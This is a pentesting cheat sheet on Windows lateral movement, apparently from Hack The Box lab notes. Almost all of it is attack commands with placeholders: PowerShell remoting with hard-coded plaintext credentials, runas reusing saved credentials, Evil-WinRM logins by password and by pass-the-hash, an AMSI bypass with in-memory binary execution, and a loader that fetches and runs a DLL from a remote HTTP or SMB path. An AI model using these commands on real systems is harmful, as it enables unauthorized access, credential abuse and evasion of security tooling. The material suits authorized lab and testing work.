# Lateral Movement

## Powershell remoting

Enable by using `Enable-PSRemoting`

Manage sessions

```
Enter-PSSession -ComputerName <fqdn>        //start new session on machine with admin priv

$ses = New-PSSession -ComputerName <fqdn>   //store session properties on variable
Enter-PSSession -Session $ses
```

Invoke-Command

```
//disable limit on laguage, enable scriptlets
Invoke-Command -ComputerName <fqdn> -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}

Invoke-Command -ComputerName <fqdn> -ScriptBlock {<code>} 
Invoke-Command -ComputerName <fqdn> -FilePath <path>    //script from file
```

Start session with valid credentials

```
$SecPassword = ConvertTo-SecureString '<pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<username>', $SecPassword)
Invoke-Command -ComputerName <fqdn> -Credential $Cred -ScriptBlock {<commands>}
```

Run a PowerShell script remotely

```
$SecPassword = ConvertTo-SecureString '<pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<username>', $SecPassword)
Invoke-Command -Credential $Cred -ComputerName <fqdn> -FilePath <path to ps1 file> -Session $sess
Enter-PSSession -Session $sess
```

## RunAs

```
cmdkey /list                                      //get a list of credentials, runas will use the ones in memory
runas /savecred /user:<user> "\\<ip>\<path>"      //connect to share
runas /savecred /user:<user> "cmd.exe /k <cmd>"   //run command as user

runas /env /noprofile /user:<username> <password> "<cmd>"
```

## Evil-WinRM

Ps1 files must be stored in path specified by -s option. To execute a script simply type its name in the console.

```
evil-winrm -i <ip> -u Administrator -p <password>
evil-winrm -i <ip> -u Administrator -H <hash>
```

### In-memory execution + AMSI Bypass

Find pre-compiled binaries for in-memory execution here: [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

```
menu
Bypass-4MSI
Invoke-Binary <path to local compiled file>
```

### Dll loader

```
Dll-loader -http -path http://<path to .dll>
Dll-loader -smb -path \\<share>\\<file>.dll
Dll-loader -local -path C:\<path to dll>
```
